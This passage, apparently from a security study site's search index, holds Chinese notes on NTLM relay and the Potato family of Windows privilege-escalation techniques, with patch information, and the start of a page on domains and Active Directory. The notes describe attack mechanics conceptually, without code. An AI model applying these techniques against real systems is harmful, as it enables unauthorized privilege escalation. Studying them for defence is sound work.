\u9996\u5148\u901a\u8fc7\u8c03API\u4f7fsystem\u6743\u9650\u7684COM\u7ec4\u4ef6\uff08BITS\uff09\u6765\u8bbf\u95ee\u6211\u4eec\u7684\u76d1\u542c\u5668\uff0c\u6267\u884cNTLM\u8ba4\u8bc1\uff0c\u5728\u6b64\u671f\u95f4\u6211\u4eec\u901a\u8fc7\u8c03\u7528\u4e00\u7cfb\u5217API\u751f\u6210\u5b89\u5168\u4e0a\u4e0b\u6587\uff0c\u6700\u7ec8system\u7684token\u4fbf\u4f1a\u7559\u5728\u6211\u4eec\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\u4e2d\u3002\u5982\u679c\u6211\u4eec\u6709SelmpersonatePrivilege\u6743\u9650\uff08iis\uff0csql server\u57fa\u672c\u4e0a\u90fd\u6709\u8fd9\u4e2a\u6743\u9650\uff09\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6a21\u62dfsystem\u8d26\u6237\u7684token\uff0c\u521b\u5efa\u65b0\u8fdb\u7a0b\uff0c\u4ece\u800c\u63d0\u6743\u3002 \u53ef\u80fd\u6709\u4eba\u4e00\u5f00\u59cb\u5728\u8bfb\u5176\u4ed6\u6587\u7ae0\u65f6\u4f1a\u7591\u60d1\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981\u4e13\u95e8\u5411135\uff08RPC\uff09\u7aef\u53e3\u53d1\u9001type 1 \u83b7\u5f97\u4e00\u4e2achallange\u5462\uff1f\u6211\u4e00\u5f00\u59cb\u4e5f\u5f88\u7591\u60d1\uff0c\u76f4\u5230\u770b\u4e86\u8fd9\u4e2a\u4ee5\u540e https://www.youtube.com/watch?v=8Wjs__mWOKI \u624d\u77e5\u9053\u539f\u6765\u53ea\u662f\u628a135\u53d1\u56de\u6765\u7684type 2\u5305\u5f53\u4e00\u4e2a\u6a21\u677f\u7f62\u4e86... \u4fee\u590d\uff1a technique won\u2019t work on versions >= Windows 10 1809 & Windows Server 2019\u3002 juicy potato\u540c\u7406 Juicy Potato Rotten Potato\u7528\u7684COM\u5bf9\u8c61\u662fBITS\uff0c\u4f46\u662f\u5728\u540e\u6765\u7684\u7248\u672c\u4e2d\uff0cwindows\u4e3a\u4e86\u4fee\u590drotten potato\u4fbf\u7981\u7528\u4e86BITS\uff0c\u7136\u540e\u628a6666\u7aef\u53e3\u5360\u7528\u4e86\uff08rotten potato POC\u7684\u9ed8\u8ba4\u7aef\u53e3\uff09\u3002 \u4e0d\u8ba9\u7528BITS\uff0c\u90a3\u5c31\u627e\u5176\u5b83\u7684COM\u5bf9\u8c61\u4e0d\u5c31\u884c\u4e86\u3002\u4e0d\u8ba9\u75286666\u7aef\u53e3\u90a3\u6362\u4e2a\u7aef\u53e3\u4e0d\u5c31\u884c\u4e86\u3002 \u627eCOM\u5bf9\u8c61\u53ea\u9700\u8981\u6ee1\u8db3\u8fd9\u51e0\u4e2a\u6761\u4ef6\u5373\u53ef\uff1a 1.\u80fd\u88ab\u5e26\u6709impersonation \u6743\u9650\u7684\u670d\u52a1\u8d26\u6237\u5b9e\u4f8b\u5316\uff08\u8c03\u7528CoGetInstanceFromIStorage\u5411\u6211\u4eec\u7684listener\u8fdb\u884cNTLM\u8ba4\u8bc1\uff09 2.\u7ee7\u627f\u81eaIMarshal \u63a5\u53e3\uff0c\u53ea\u6709\u7ee7\u627f\u81ea\u8fd9\u4e2a\u63a5\u53e3\u624d\u53ef\u4ee5\u5728\u901a\u8baf\u8fc7\u7a0b\u4e2d\u89e6\u53d1NTLM\u8ba4\u8bc1 3.\u7531administrator\u6216system\u8fd0\u884c\u7684com\u5bf9\u8c61 ohpe\u5e08\u5085\u5df2\u7ecf\u627e\u5230\u4e86\u5f88\u591aCOM\u5bf9\u8c61 http://ohpe.it/juicy-potato/CLSID/ \u4fee\u590d\uff1a \u7531\u4e8e\u672c\u8d28\u548cRotten Potato\u6ca1\u5565\u533a\u522b\uff0c\u6240\u4ee5Rotten Potato\u6b7b\u4e86\u8fd9\u4e2a\u4e5f\u8ddf\u7740\u6b7b\u4e86\uff1atechnique won\u2019t work on versions >= Windows 10 1809 & Windows Server 2019 \u5177\u4f53\u662f\u600e\u4e48\u4fee\u590d\u7684\u5462\uff1f\u8fd9\u4e2a\u5bf9\u4e8e\u540e\u9762\u7684rogue potato\u6765\u8bf4\u5f88\u91cd\u8981\u3002\u4ecedecoder\u5e08\u5085\u7684\u6587\u7ae0\u4e2d\uff08 https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/ \uff09\u53ef\u4ee5\u603b\u7ed3\u51fa\u4fee\u590d\u65b9\u6cd5\u4e3a Rogue Potato","title":"NTLM Relay\u53ca\u76f8\u5173\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#ntlm-relay","text":"","title":"NTLM Relay\u53ca\u76f8\u5173\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#_1","text":"\u7b51\u57fa \u571f\u8c46 Origin Potato_MS08-068 (\u571f\u8c46\u59cb\u7956\u6f0f\u6d1e) Hot Potato Rotten Potato Juicy Potato Rogue Potato","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#_2","text":"","title":"\u7b51\u57fa"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#_3","text":"","title":"\u571f\u8c46"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#origin-potato_ms08-068","text":"\u672c\u5730smb\u2192smb \u4fee\u590d\u65b9\u6848\uff1a \u4e3b\u673a A \u5411\u4e3b\u673a B(\u8bbf\u95ee \\B ) \u8fdb\u884c SMB \u8ba4\u8bc1\u7684\u65f6\u5019\uff0c\u5c06 pszTargetName \u8bbe\u7f6e\u4e3a cifs/B , \u7136\u540e\u5728 type 2 \u62ff\u5230\u4e3b\u673a B \u53d1\u9001 Challenge \u4e4b\u540e\uff0c\u5728 lsass \u91cc\u9762\u7f13\u5b58 ( Challenge ,cifs/B)\u3002 \u7136\u540e\u4e3b\u673a B \u5728\u62ff\u5230\u4e3b\u673a A \u7684 type 3 \u4e4b\u540e\uff0c\u4f1a\u53bb\u67e5\u770b lsass \u91cc\u9762\u6709\u6ca1\u6709\u7f13\u5b58 ( Challenge , cifs/b )\uff0c\u5982\u679c\u5b58\u5728\u7f13\u5b58\uff0c\u90a3\u4e48\u8ba4\u8bc1\u5931\u8d25\u3002 \u8fd9\u79cd\u60c5\u51b5\u5e95\u4e0b\uff0c\u5982\u679c\u4e3b\u673a B \u548c\u4e3b\u673a A \u662f\u4e0d\u540c\u7684\u4e3b\u673a\u7684\u8bdd\uff0c\u90a3 lsass \u91cc\u9762\u5c31\u4e0d\u4f1a\u7f13\u5b58 ( Challenge , cifs/B )\u3002\u5982\u679c\u662f\u540c\u4e00\u53f0\u4e3b\u673a\u7684\u8bdd\uff0c\u90a3 lsass \u91cc\u9762\u80af\u5b9a\u6709\u7f13\u5b58\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u4f1a\u8ba4\u8bc1\u5931\u8d25\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u4e3b\u673a\u6536\u5230chanllage\uff08type 2\uff09\u540e\u4f1a\u5728\u672c\u5730\u5bf9\u5176\u8fdb\u884c\u4e00\u4e2a\u7f13\u5b58\u8bb0\u5f55\uff0c\u5728\u6536\u5230type 3\u540e\u4f1a\u6821\u9a8c\u672c\u5730\u662f\u5426\u6709type 2\u5bf9\u5e94\u7684\u8bb0\u5f55\u3002\u5982\u679c\u6709\u8bb0\u5f55\uff0c\u5c31\u8bf4\u660e\u662f\u672c\u5730smb\u5230smb\u7684Relay\uff0c\u8fd4\u56de\u6821\u9a8c\u5931\u8d25\u3002","title":"Origin Potato_MS08-068 (\u571f\u8c46\u59cb\u7956\u6f0f\u6d1e)"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#hot-potato","text":"\u5229\u7528windows update\uff0c\u5b9e\u73b0http\u5230smb\u7684relay \u600e\u4e48\u53d1\u8d77ntlm\u8bf7\u6c42 \u53d1\u8d77ntlm\u8bf7\u6c42\u8bf7\u6c42\u7684\u65b9\u5f0f: \u914d\u5408NBNS\u6295\u6bd2\u6b3a\u9a97\u548c\u4f2a\u9020WPAD\u4ee3\u7406\u670d\u52a1\u5668\u62ff\u5230\u7528\u6237\u7684 Net-NTML hash \uff0c\u6240\u6709\u7684HTTP\u8bf7\u6c42\u5c06\u4f1a\u88ab\u91cd\u5b9a\u5411\u81f3 \" http://localhost/GETHASHESxxxxx \" \uff0c\u5176\u4e2d\u7684xxxxx\u8868\u793a\u7684\u662f\u67d0\u4e9b\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5c06\u4f1a\u5f71\u54cd\u76ee\u6807\u4e3b\u673a\u4e2d\u6240\u6709\u7684\u7528\u6237\uff0c\u5305\u62ec\u7ba1\u7406\u5458\u8d26\u6237\u548c\u7cfb\u7edf\u8d26\u6237 2. \u62ff\u5230ntlm \u8bf7\u6c42\u4e4b\u540e\u8981\u505a\u4ec0\u4e48 MS08-068\u867d\u7136\u9650\u5236\u4e86\u540c\u53f0\u4e3b\u673a\u4e4b\u95f4smb\u5230smb\u7684Relay\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u9650\u5236\u4ecehttp\u5230smb\uff0c\u6211\u4eec\u914d\u7f6e\u914d\u5408NBNS\u6295\u6bd2\u6b3a\u9a97\u548c\u4f2a\u9020WPAD\u4ee3\u7406\u670d\u52a1\u5668\u62ff\u5230\u7684ntlm\u8bf7\u6c42\u8bf4http\u7684\u5f62\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5relay \u5230\u672c\u673a\u7684smb\u3002 3. \u670d\u52a1\u7aef\u662f\u5426\u8981\u6c42\u7b7e\u540d \u6211\u4eecRelay\u5230\u7684\u670d\u52a1\u7aef\u534f\u8bae\u662fsmb\uff0c\u9664\u975e\u662f\u57df\u5185\u7684\u57df\u63a7\uff0c\u4e0d\u7136\u5728\u5de5\u4f5c\u7ec4\u73af\u8282\u5e95\u4e0b\uff0c\u6216\u8005\u57df\u5185\u7684\u57df\u6210\u5458\u673a\u5668\uff0c\u90fd\u662f\u4e0d\u8981\u6c42\u7b7e\u540d\u7684\u3002 \u4fee\u590d\uff1a MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.","title":"Hot Potato"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#rotten-potato","text":"\u7b80\u800c\u8a00\u4e4b\uff1a\u662f\u4e2a\u63d0\u6743\u3002 \u9996\u5148\u901a\u8fc7\u8c03API\u4f7fsystem\u6743\u9650\u7684COM\u7ec4\u4ef6\uff08BITS\uff09\u6765\u8bbf\u95ee\u6211\u4eec\u7684\u76d1\u542c\u5668\uff0c\u6267\u884cNTLM\u8ba4\u8bc1\uff0c\u5728\u6b64\u671f\u95f4\u6211\u4eec\u901a\u8fc7\u8c03\u7528\u4e00\u7cfb\u5217API\u751f\u6210\u5b89\u5168\u4e0a\u4e0b\u6587\uff0c\u6700\u7ec8system\u7684token\u4fbf\u4f1a\u7559\u5728\u6211\u4eec\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\u4e2d\u3002\u5982\u679c\u6211\u4eec\u6709SelmpersonatePrivilege\u6743\u9650\uff08iis\uff0csql server\u57fa\u672c\u4e0a\u90fd\u6709\u8fd9\u4e2a\u6743\u9650\uff09\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6a21\u62dfsystem\u8d26\u6237\u7684token\uff0c\u521b\u5efa\u65b0\u8fdb\u7a0b\uff0c\u4ece\u800c\u63d0\u6743\u3002 \u53ef\u80fd\u6709\u4eba\u4e00\u5f00\u59cb\u5728\u8bfb\u5176\u4ed6\u6587\u7ae0\u65f6\u4f1a\u7591\u60d1\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981\u4e13\u95e8\u5411135\uff08RPC\uff09\u7aef\u53e3\u53d1\u9001type 1 \u83b7\u5f97\u4e00\u4e2achallange\u5462\uff1f\u6211\u4e00\u5f00\u59cb\u4e5f\u5f88\u7591\u60d1\uff0c\u76f4\u5230\u770b\u4e86\u8fd9\u4e2a\u4ee5\u540e https://www.youtube.com/watch?v=8Wjs__mWOKI \u624d\u77e5\u9053\u539f\u6765\u53ea\u662f\u628a135\u53d1\u56de\u6765\u7684type 2\u5305\u5f53\u4e00\u4e2a\u6a21\u677f\u7f62\u4e86... \u4fee\u590d\uff1a technique won\u2019t work on versions >= Windows 10 1809 & Windows Server 2019\u3002 juicy potato\u540c\u7406","title":"Rotten Potato"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#juicy-potato","text":"Rotten Potato\u7528\u7684COM\u5bf9\u8c61\u662fBITS\uff0c\u4f46\u662f\u5728\u540e\u6765\u7684\u7248\u672c\u4e2d\uff0cwindows\u4e3a\u4e86\u4fee\u590drotten potato\u4fbf\u7981\u7528\u4e86BITS\uff0c\u7136\u540e\u628a6666\u7aef\u53e3\u5360\u7528\u4e86\uff08rotten potato POC\u7684\u9ed8\u8ba4\u7aef\u53e3\uff09\u3002 \u4e0d\u8ba9\u7528BITS\uff0c\u90a3\u5c31\u627e\u5176\u5b83\u7684COM\u5bf9\u8c61\u4e0d\u5c31\u884c\u4e86\u3002\u4e0d\u8ba9\u75286666\u7aef\u53e3\u90a3\u6362\u4e2a\u7aef\u53e3\u4e0d\u5c31\u884c\u4e86\u3002 \u627eCOM\u5bf9\u8c61\u53ea\u9700\u8981\u6ee1\u8db3\u8fd9\u51e0\u4e2a\u6761\u4ef6\u5373\u53ef\uff1a 1.\u80fd\u88ab\u5e26\u6709impersonation \u6743\u9650\u7684\u670d\u52a1\u8d26\u6237\u5b9e\u4f8b\u5316\uff08\u8c03\u7528CoGetInstanceFromIStorage\u5411\u6211\u4eec\u7684listener\u8fdb\u884cNTLM\u8ba4\u8bc1\uff09 2.\u7ee7\u627f\u81eaIMarshal \u63a5\u53e3\uff0c\u53ea\u6709\u7ee7\u627f\u81ea\u8fd9\u4e2a\u63a5\u53e3\u624d\u53ef\u4ee5\u5728\u901a\u8baf\u8fc7\u7a0b\u4e2d\u89e6\u53d1NTLM\u8ba4\u8bc1 3.\u7531administrator\u6216system\u8fd0\u884c\u7684com\u5bf9\u8c61 ohpe\u5e08\u5085\u5df2\u7ecf\u627e\u5230\u4e86\u5f88\u591aCOM\u5bf9\u8c61 http://ohpe.it/juicy-potato/CLSID/ \u4fee\u590d\uff1a \u7531\u4e8e\u672c\u8d28\u548cRotten Potato\u6ca1\u5565\u533a\u522b\uff0c\u6240\u4ee5Rotten Potato\u6b7b\u4e86\u8fd9\u4e2a\u4e5f\u8ddf\u7740\u6b7b\u4e86\uff1atechnique won\u2019t work on versions >= Windows 10 1809 & Windows Server 2019 \u5177\u4f53\u662f\u600e\u4e48\u4fee\u590d\u7684\u5462\uff1f\u8fd9\u4e2a\u5bf9\u4e8e\u540e\u9762\u7684rogue potato\u6765\u8bf4\u5f88\u91cd\u8981\u3002\u4ecedecoder\u5e08\u5085\u7684\u6587\u7ae0\u4e2d\uff08 https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/ \uff09\u53ef\u4ee5\u603b\u7ed3\u51fa\u4fee\u590d\u65b9\u6cd5\u4e3a","title":"Juicy Potato"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/#rogue-potato","text":"","title":"Rogue Potato"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/","text":"Windows\u5185\u7f51\u57fa\u7840\u6982\u89c8 \u76ee\u5f55 \u57df\uff0c\u5de5\u4f5c\u7ec4\uff0c\u6d3b\u52a8\u76ee\u5f55 \u5de5\u4f5c\u7ec4 \u57df \u5de5\u4f5c\u7ec4\u548c\u57df\u7684\u533a\u522b \u6d3b\u52a8\u76ee\u5f55 NTLM\u534f\u8bae \u9a8c\u8bc1\u673a\u5236 Kerberos\u534f\u8bae \u6574\u4f53\u6d41\u7a0b \u53c2\u4e0e\u7684\u5173\u952e\u89d2\u8272 Kerberos\u8ba4\u8bc1\u8be6\u89e3\uff1a 1.\u7528\u6237\u767b\u5f55 2.\u8bf7\u6c42\u8eab\u4efd\u8ba4\u8bc1\uff08client\u548ckdc\u53cc\u5411\u8ba4\u8bc1\uff09 2.1 \u5ba2\u6237\u7aef\u5411AS\u53d1\u9001\u8ba4\u8bc1\u8bf7\u6c42 2.2AS\u786e\u8ba4\u5ba2\u6237\u7aef\u8eab\u4efd 3. \u8bf7\u6c42\u670d\u52a1\u6388\u6743\uff08client\u8bf7\u6c42kdc\u8ba4\u8bc1server\uff09 3.1 \u5ba2\u6237\u7aef\u5411TGS\u53d1\u9001\u8bf7\u6c42\u670d\u52a1\u6388\u6743\u8bf7\u6c42 3.2 TGS\u4e3aClient\u54cd\u5e94\u670d\u52a1\u6388\u6743\u7968\u636e 4. \u53d1\u9001\u670d\u52a1\u8bf7\u6c42\uff08client\u4e0ess\u53cc\u5411\u8ba4\u8bc1\uff09 4.1 Client\u5411SS(Service Server)\u53d1\u9001\u670d\u52a1\u8bf7\u6c42 4.2 SS\u54cd\u5e94Client Kerberos\u6293\u5305\u5206\u6790 ASREQ ASREP TGSREQ TGSREP SMB\u534f\u8bae SMB\u8ba4\u8bc1 \u6293\u5305\u5206\u6790 TIPS \u57df\uff0c\u5de5\u4f5c\u7ec4\uff0c\u6d3b\u52a8\u76ee\u5f55 \u5de5\u4f5c\u7ec4 \u5de5\u4f5c\u7ec4\u53ef\u4ee5\u8ba4\u4e3a\u662f\u540c\u4e00\u7f51\u7edc\u5185\uff0c\u529f\u80fd\u76f8\u4f3c\u7684\u7535\u8111\u8fdb\u884c\u7684\u5206\u7ec4\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a \u201c\u5728\u4e00\u4e2a\u7f51\u7edc\u5185\uff0c\u53ef\u80fd\u6709\u6210\u767e\u4e0a\u5343\u53f0\u7535\u8111\uff0c\u5982\u679c\u8fd9\u4e9b\u7535\u8111\u4e0d\u8fdb\u884c\u5206\u7ec4\uff0c\u90fd\u5217\u5728\u201c\u7f51\u4e0a\u90bb\u5c45\u201d\u5185\uff0c\u53ef\u60f3\u800c\u77e5\u4f1a\u6709\u591a\u4e48\u4e71\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff0cWindows 9x/NT/2000\u5c31\u5f15\u7528\u4e86\u201c\u5de5\u4f5c\u7ec4\u201d\u8fd9\u4e2a\u6982\u5ff5\uff0c\u5c06\u4e0d\u540c\u7684\u7535\u8111\u4e00\u822c\u6309\u529f\u80fd\u5206\u522b\u5217\u5165\u4e0d\u540c\u7684\u7ec4\u4e2d\uff0c\u5982\u8d22\u52a1\u90e8\u7684\u7535\u8111\u90fd\u5217\u5165\u201c\u8d22\u52a1\u90e8\u201d\u5de5\u4f5c\u7ec4\u4e2d\uff0c\u4eba\u4e8b\u90e8\u7684\u7535\u8111\u90fd\u5217\u5165\u201c\u4eba\u4e8b\u90e8\u201d\u5de5\u4f5c\u7ec4\u4e2d\u3002\u4f60\u8981\u8bbf\u95ee\u67d0\u4e2a\u90e8\u95e8\u7684\u8d44\u6e90\uff0c\u5c31\u5728\u201c\u7f51\u4e0a\u90bb\u5c45\u201d\u91cc\u627e\u5230\u90a3\u4e2a\u90e8\u95e8\u7684\u5de5\u4f5c\u7ec4\u540d\uff0c\u53cc\u51fb\u5c31\u53ef\u4ee5\u770b\u5230\u90a3\u4e2a\u90e8\u95e8\u7684\u7535\u8111\u4e86\u3002 \u201d \u8fd9\u5c31\u662f\u5de5\u4f5c\u7ec4\uff0c\u4f46\u662f\u5728\u5de5\u4f5c\u7ec4\u4e2d\u7684\u7535\u8111\u8fd8\u662f\u5404\u81ea\u7ba1\u7406\u3002\u5f53\u5176\u4e2d\u4e00\u53f0\u8ba1\u7b97\u673a\u8bbf\u95ee\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u65f6\u8fd8\u662f\u8981\u7ecf\u8fc7\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u7684\u8ba4\u8bc1\u7684 \u57df \u57df\uff0c\u662f\u4e00\u7fa4\u76f8\u4e92\u4fe1\u4efb\u7684\u8ba1\u7b97\u673a\u7684\u96c6\u5408 \u60f3\u8981\u8bbf\u95ee\u57df\u4e2d\u8d44\u6e90\u5c31\u5fc5\u987b\u7ecf\u8fc7\u4e00\u53f0\u8d1f\u8d23\u6bcf\u4e00\u53f0\u8054\u5165\u7f51\u7edc\u7684\u7535\u8111\u548c\u7528\u6237\u7684\u9a8c\u8bc1\u5de5\u4f5c\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u4e2a\u670d\u52a1\u5668\u53eb\u505a \u57df\u63a7\u5236\u5668 \uff08Domain Controller\uff0c\u7b80\u5199\u4e3aDC\uff09 \u7684\u5b89\u5168\u8ba4\u8bc1\u3002\u6bcf\u4e2a\u57df\u81f3\u5c11\u8981\u6709\u4e00\u4e2a\u57df\u63a7\u5236\u5668\u3002 \u5f53\u67d0\u8ba1\u7b97\u673a\u8fde\u5165\u57df\u65f6\uff0cDC\u5c31\u4f1a\u9274\u522b\u8fd9\u53f0\u7535\u8111\u662f\u5426\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u57df\u7684\uff0c\u7528\u6237\u4f7f\u7528\u7684\u767b\u5f55\u8d26\u53f7\u662f\u5426\u5b58\u5728\u3001\u5bc6\u7801\u662f\u5426\u6b63\u786e\u3002\u5982\u679c\u4ee5\u4e0a\u4fe1\u606f\u4e0d\u6b63\u786e\uff0c\u57df\u63a7\u5236\u5668\u5c31\u62d2\u7edd\u8fd9\u4e2a\u7528\u6237\u4ece\u8fd9\u53f0\u7535\u8111\u767b\u5f55\u3002\u4e0d\u80fd\u767b\u5f55\uff0c\u7528\u6237\u5c31\u4e0d\u80fd\u8bbf\u95ee\u670d\u52a1\u5668\u4e0a\u6709\u6743\u9650\u4fdd\u62a4\u7684\u8d44\u6e90 \u3002 \u53e6\u5916\uff0c\u5f53\u4e00\u4e2a\u57df\u548c\u53e6\u4e00\u4e2a\u57df\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u540e\uff0c\u4e24\u4e2a\u57df\u5c31\u53ef\u4ee5\u6309\u9700\u8981\u76f8\u4e92\u7ba1\u7406 \u5de5\u4f5c\u7ec4\u548c\u57df\u7684\u533a\u522b \u201c \u5de5\u4f5c\u7ec4\u662f\u4e00\u7fa4\u8ba1\u7b97\u673a\u7684\u96c6\u5408\uff0c\u5b83\u4ec5\u4ec5\u662f\u4e00\u4e2a\u903b\u8f91\u7684\u96c6\u5408\uff0c\u5404\u81ea\u8ba1\u7b97\u673a\u8fd8\u662f\u5404\u81ea\u7ba1\u7406\u7684\uff0c\u4f60\u8981\u8bbf\u95ee\u5176\u4e2d\u7684\u8ba1\u7b97\u673a\uff0c\u8fd8\u662f\u8981\u5230\u88ab\u8bbf\u95ee\u8ba1\u7b97\u673a\u4e0a\u6765\u5b9e\u73b0\u7528\u6237\u9a8c\u8bc1\u7684\u3002\u800c\u57df\u4e0d\u540c\uff0c\u57df\u662f\u4e00\u4e2a\u6709\u5b89\u5168\u8fb9\u754c\u7684\u8ba1\u7b97\u673a\u96c6\u5408\uff0c\u5728\u540c\u4e00\u4e2a\u57df\u4e2d\u7684\u8ba1\u7b97\u673a\u5f7c\u6b64\u4e4b\u95f4\u5df2\u7ecf\u5efa\u7acb\u4e86\u4fe1\u4efb\u5173\u7cfb\uff0c\u5728\u57df\u5185\u8bbf\u95ee\u5176\u4ed6\u673a\u5668\uff0c\u4e0d\u518d\u9700\u8981\u88ab\u8bbf\u95ee\u673a\u5668\u7684\u8bb8\u53ef\u4e86\u3002 \u201d \u6d3b\u52a8\u76ee\u5f55 \u6d3b\u52a8\u76ee\u5f55 (Active Directory,AD) ,\u7528\u4e8e\u5b58\u50a8\u6709\u5173\u7f51\u7edc\u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u5e2e\u52a9\u7528\u6237\u5feb\u901f\u51c6\u786e\u7684\u627e\u5230\u6240\u9700\u7684\u4fe1\u606f\u670d\u52a1,\u201c \u5982\u679c\u628a\u4f01\u4e1a\u7684\u5185\u7f51\u770b\u6210\u4e00\u672c\u5b57\u5178\uff0c\u90a3\u4e48 \u5185\u7f51\u91cc\u7684\u8d44\u6e90\u5c31\u662f\u5b57\u5178\u91cc\u7684\u5185\u5bb9\uff0c\u6d3b\u52a8\u76ee\u5f55\u5c31\u76f8\u5f53\u4e8e\u5b57\u5178\u7684\u7d22\u5f15 \u201d \u6d3b\u52a8\u76ee\u5f55\u7684\u529f\u80fd\uff1a \u8d26\u53f7\u96c6\u4e2d\u7ba1\u7406 \u8f6f\u4ef6\u96c6\u4e2d\u7ba1\u7406 \u73af\u5883\u96c6\u4e2d\u7ba1\u7406 \u589e\u5f3a\u5b89\u5168\u6027 \u66f4\u53ef\u9760\uff0c\u66f4\u77ed\u7684\u5b95\u673a\u65f6\u95f4 \u201c\u8981\u5b9e\u73b0\u57df\u73af\u5883\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5b89\u88c5AD\uff0c \u5982\u679c\u5185\u7f51\u4e2d\u7684\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u5b89\u88c5\u4e86AD\uff0c\u5b83\u5c31\u53d8\u6210\u4e86DC(\u7528\u4e8e\u5b58\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u7684\u8ba1\u7b97\u673a)\u3002 \u201d NTLM\u534f\u8bae 